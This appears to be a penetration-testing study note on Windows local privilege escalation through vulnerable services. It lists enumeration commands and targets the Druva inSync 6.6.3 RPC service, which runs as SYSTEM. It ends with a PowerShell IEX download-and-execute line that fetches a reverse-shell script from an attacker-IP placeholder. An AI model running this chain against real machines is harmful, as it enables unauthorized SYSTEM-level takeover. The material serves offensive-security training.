# Vulnerable Services — Windows LPE

```
# 1. Enumerate installed software
wmic product get name

# 2. Check suspicious local ports
netstat -ano | findstr <PORT>

# 3. Map PID → process
Get-Process -Id <PID>

# 4. Confirm related Windows service
Get-Service | ? {$_.DisplayName -like '<NAME>*'}
```

### Workflow

`Installed app → Version → Search CVE/PoC → Find listening port → Map PID → Confirm service`

### Druva inSync 6.6.3

- Vulnerable to **local command injection/path traversal**
- RPC service: `127.0.0.1:6064`
- Service runs as **SYSTEM**
- PoC can execute commands as `NT AUTHORITY\SYSTEM`
We may be able to use [this](https://www.exploit-db.com/exploits/49211) exploit PoC to escalate our privileges.
### Exploitation

```
# Replace $cmd in PoC with desired command
$cmd = "<COMMAND>"
```

Reverse shell approach:

```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<ATTACKER_IP>:8080/shell.ps1')"
```
